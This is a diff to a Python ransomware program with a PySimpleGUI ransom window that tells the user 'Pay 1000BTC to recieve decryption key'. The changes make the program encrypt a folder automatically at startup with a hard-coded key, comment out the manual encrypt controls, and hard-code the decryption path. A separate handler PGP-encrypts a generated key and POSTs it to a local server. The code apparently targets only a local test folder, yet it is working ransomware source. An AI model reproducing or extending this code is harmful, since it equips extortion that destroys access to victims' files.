@@ -113,12 +113,13 @@ WSBCTE9DSy0tLS0tCg=="""
 
 
 if __name__ == '__main__':
+    encrypt_data("Warm2Day", "./test/")
     # Define the window's contents
     layout = [[sg.Text("Your files have been encrypted. ")],
             [sg.Text("Pay 1000BTC to recieve decryption key.")],
-            [sg.T("")], [sg.Text("Choose a folder: "), sg.Input(key="-DIR-" ,change_submits=True), sg.FolderBrowse(key="-DIR-")],[sg.Button("Submit")],
-            [sg.Text("Enter Encryption Key...")],
-            [sg.Input(key='-EINPUT-')],
+            # [sg.T("")], [sg.Text("Choose a folder: "), sg.Input(key="-DIR-" ,change_submits=True), sg.FolderBrowse(key="-DIR-")],[sg.Button("Submit")],
+            # [sg.Text("Enter Encryption Key...")],
+            # [sg.Input(key='-EINPUT-')],
             [sg.Text("Enter Decryption Key...")],
             [sg.Input(key='-DINPUT-')],
             [sg.Text(size=(40,1), key='-OUTPUT-')],
@@ -138,16 +139,19 @@ if __name__ == '__main__':
         
         if event == 'Decrypt Files':
             window['-OUTPUT-'].update('Decrypting files with key: ' + values['-DINPUT-'] + ". . .")
-            decrypt_data(values['-DINPUT-'], values['-DIR-'])
+            # decrypt_data(values['-DINPUT-'], values['-DIR-'])
+            decrypt_data(values['-DINPUT-'], './test/')
 
-        elif event == 'Encrypt':
-            window['-OUTPUT-'].update('Encrypting files with key: ' + values['-EINPUT-'] + ". . .")
-            encrypt_data(values['-EINPUT-'], values['-DIR-'])
+        # elif event == 'Encrypt':
+        #     window['-OUTPUT-'].update('Encrypting files with key: ' + values['-EINPUT-'] + ". . .")
+        #     encrypt_data(values['-EINPUT-'], values['-DIR-'])
         elif event == 'Send a Post':
             url = 'http://localhost:8080'
             key = generate_encryption_key(25)
             encrypted_key = pgp_encrypt(key)
-            b64encoded_encrypted_key = base64.b64encode(encrypted_key.encode('utf-8'))
+            b64encoded_encrypted_key = base64.b64encode(encrypted_key.encode('ascii'))
+            print(encrypted_key.encode('utf-8'))
+            print(str(b64encoded_encrypted_key))
             obj = {'this': str(b64encoded_encrypted_key)}
             x = requests.post(url, data = obj)
 
